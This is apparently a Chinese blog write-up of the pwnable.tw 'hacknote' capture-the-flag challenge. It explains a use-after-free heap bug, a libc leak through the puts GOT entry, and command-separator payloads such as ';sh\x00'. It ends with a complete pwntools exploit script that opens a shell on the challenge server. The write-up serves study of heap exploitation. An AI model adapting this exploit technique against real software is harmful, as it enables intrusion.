---
title: pwnable.tw - hacknote の Write-Up
date: 2020-07-09 14:31:56
categories:
- WriteUPs
- pwnable.tw
tags:
- PWN
- Heap
---
## Introduction

&emsp;&emsp;[pwnable.tw](https://pwnable.tw/)是一个pwn题刷题网站，里面收集了很多不错的pwn题。hacknote是一道比较简单的堆溢出的题目，刚好适合开始接触堆溢出不久的rookie，能够帮助理解和掌握有关堆溢出利用相关知识。

<!-- more -->

## Step 1

&emsp;&emsp;首先运行程序：

![](/img/Hacknote/Hacknote1.png)

&emsp;&emsp;看起来是一个日记本程序，可以添加、删除、打印日记，标准的堆溢出题目。

&emsp;&emsp;checksec：

![](/img/Hacknote/Hacknote2.png)

&emsp;&emsp;32位程序，栈上的保护还是比较齐全的。

## Step 2

&emsp;&emsp;将程序丢到hopper中，首先看一下主函数：

![](/img/Hacknote/Hacknote3.png)

&emsp;&emsp;函数逻辑还是比较简单的，首先是菜单的显示：

![](/img/Hacknote/Hacknote4.png)

&emsp;&emsp;然后是对各个功能的处理函数，首先是功能1添加note：

![](/img/Hacknote/Hacknote5.png)

&emsp;&emsp;Add函数首先会判断目前note的数量，如果超过5，那么会显示’Full’然后退出。如果没有超过5会从0开始遍历，直到找到一个空的项，申请一个8字节的堆块。如果分配错误，返回’Alloca Error’并退出，分配成功则将储存一个指针指向0x804862b，另一个指针指向note的内容，而0x804862b位置是一个输出note内容的函数sub_804862b：

![](/img/Hacknote/Hacknote6.png)

&emsp;&emsp;之后根据读入的size大小申请一个堆块，再读入字符串为内容，最后将note的计数加1。

&emsp;&emsp;然后是对功能2删除note的处理函数：

![](/img/Hacknote/Hacknote7.png)

&emsp;&emsp;Delete函数相对就比较简单了，判断一下要读入的要删除note的编号是否符合范围要求，再判断一下编号对应的note有没有，如果没有就返回‘Out of bound!’，如果有就free对应的note。

&emsp;&emsp;接着是功能3打印note：

![](/img/Hacknote/Hacknote8.png)

&emsp;&emsp;Print函数和Delete函数很像，只是最后是调用Add函数中的sub_804862b函数输出指定的编号对应的note的内容。

&emsp;&emsp;最后是退出程序：

![](/img/Hacknote/Hacknote9.png)

&emsp;&emsp;程序的逻辑比较简单，通过逆向的伪代码基本已经了解透彻了。

## Step 3

&emsp;&emsp;程序逻辑流程明白之后，就是要在其中找漏洞。这一题的漏洞点在于Delete函数释放指针之后没有将其值清空，这样会出现Use After Free和Double Free漏洞。关于这两个漏洞的原理和利用网上资料比较多，也可以参考我之前的文章[堆溢出漏洞小结](https://coldwave96.github.io/2020/07/07/HeapOverflow/)。

&emsp;&emsp;首先要明确利用漏洞需要获得什么结果：

* 需要知道程序运行时system函数实际地址；

* 获取诸如’/bin/sh’的字符串的位置；

* 控制程序的运行流。

&emsp;&emsp;下面从漏洞利用的角度再来细细品一下这个程序。

&emsp;&emsp;每个note生成时程序会申请8字节的堆块来存放该note的指向sub_804862b函数的指针和指向内容的指针。然后程序会根据输入的size大小来申请合适大小的堆块用来存储note的内容。

&emsp;&emsp;显然note的结构是一个fastbin chunk，大小是16字节，至于为什么是16字节可能需要先去了解下堆的机制，可以参考下[关于堆的bin结构的理解](https://coldwave96.github.io/2020/07/02/Heap-bin/)和[堆溢出入门基础知识](https://coldwave96.github.io/2020/06/30/Heap/)。

&emsp;&emsp;我们的目的是控制程序的运行流去执行system等函数，那么我们可以考虑修改某个note的指向sub_804862b函数的指针，将其修改为我们想要执行的函数地址。这样当执行print函数的功能时程序就回去执行我们想要执行的函数。

&emsp;&emsp;既然我们需要修改某个note的指针，而程序中只有唯一的方法可以赋值，所以我们必须在Add note中利用写入note内容的功能来进行覆盖。

&emsp;&emsp;具体思路如下：

* 申请note0，size为20（大小与note大小所在的bin不一样就可以）；

* 申请note1，size为20；

* Delete note0；

* Delete note1；

* 申请note2， size为8（此时根据fastbin的LIFO策略，其实note2分配的是note1，而note2的size则是对应的note0）；

* 这时我们输入的note2的内容其实就覆盖了note0的指向sub_804862b函数的指针和指向note0的内容的指针；

* 所以当Print note0的时候，程序就会去调用覆盖的函数。

&emsp;&emsp;这样我们就解决了控制程序运行流的问题。

&emsp;&emsp;接下来就是获取程序运行时system函数在内存中的实际地址。可以看到题目给了libc文件，那么可以像栈溢出那样泄露libc基址加上offset获得system函数的地址。

&emsp;&emsp;具体思路如下：

* 将note0的指向内容的指针覆盖为puts函数在got表的地址；

* Print note0就可以打印出read的实际地址；

* 利用system_addr - system_libc = puts_addr - puts_libc计算出system_addr；

&emsp;&emsp;最后是system函数的参数，由于一共只有8字节，除去system函数的地址只有4字节，所以选择写入字符串’sh’或者’$0’。

&emsp;&emsp;但是这里还有个小问题，Print函数是将note0的8字节结构的地址当作参数传递给system函数的，所以前半部分的system函数地址也会被当作参数导致system函数执行时报错。

&emsp;&emsp;所以需要进行system参数截断，可以使用如下的方式：

* ‘;sh\x00’ or ‘;$0\x00'

* ‘&&sh’ or ‘&&$0'

* ‘||sh’ or ‘||$0'

&emsp;&emsp;到这里这题的解题思路就梳理完毕了，之后就是EXP的编写了。

## Step 4

&emsp;&emsp;直接给出EXP脚本：

```Python
from pwn import *

sh = remote('chall.pwnable.tw', 10102)
# sh = process('./hacknote')
elf = ELF('./hacknote')

libc = ELF('./libc_32.so.6')

def add_note(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(str(content))

def delete_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

print_puts = 0x0804862b
puts_got = elf.got['puts']

add_note(20, 'aaaa')
add_note(20, 'aaaa')
delete_note(0)
delete_note(1)

add_note(0x8, p32(print_puts) + p32(puts_got))
print_note(0)
puts_addr = u32(sh.recv(4))

puts_libc = libc.symbols['puts']
sys_libc = libc.symbols['system']
sys_addr = puts_addr - puts_libc + sys_libc

delete_note(2)
add_note(0x8, p32(sys_addr) + ';sh\x00')
print_note(0)

sh.interactive()
sh.close()
```

&emsp;&emsp;脚本运行结果：

![](/img/Hacknote/Hacknote10.png)